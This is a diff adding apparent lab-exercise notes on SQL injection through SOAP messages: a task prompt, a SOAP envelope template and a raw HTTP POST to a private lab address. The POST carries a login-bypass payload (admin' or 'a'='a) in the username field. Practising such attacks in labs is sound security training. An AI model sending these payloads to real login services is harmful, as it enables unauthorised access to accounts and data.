@@ -1,0 +1,58 @@
+Assess the target, identify an SQL Injection vulnerability through SOAP messages and answer the question below:
+
+https://www.w3schools.com/xml/xml_soap.asp
+-----------------------------------------------
+<?xml version="1.0"?>
+<soap:Envelope
+xmlns:soap="http://www.w3.org/2003/05/soap-envelope/"
+soap:encodingStyle="http://www.w3.org/2003/05/soap-encoding">
+<soap:Header>
+...
+</soap:Header>
+<soap:Body>
+...
+  <soap:Fault>
+  ...
+  </soap:Fault>
+</soap:Body>
+</soap:Envelope>
+-----------------------------------------------
+POST /wsdl HTTP/1.1
+Host: 10.129.107.39:3002
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+Sec-GPC: 1
+Accept-Language: en-US,en
+Accept-Encoding: gzip, deflate
+Connection: close
+SOAPAction: "Login"
+Content-Type: text/xml:charset=UTF-8
+Content-Length: 425
+
+<?xml version="1.0"?>
+
+<soap:Envelope
+
+xmlns:soap="http://www.w3.org/2003/05/soap-envelope/"
+
+soap:encodingStyle="http://www.w3.org/2003/05/soap-encoding">
+
+<soap:Header>
+
+</soap:Header>
+<soap:Body>
+<tem:LoginRequest>
+<!--type: string-->
+<tem:username>
+admin' or 'a'='a
+</tem:username>
+<!--type: string-->
+<tem:password>
+sonoras imperio
+</tem:password>
+</tem:LoginRequest>
+</soap:Body>
+
+</soap:Envelope>
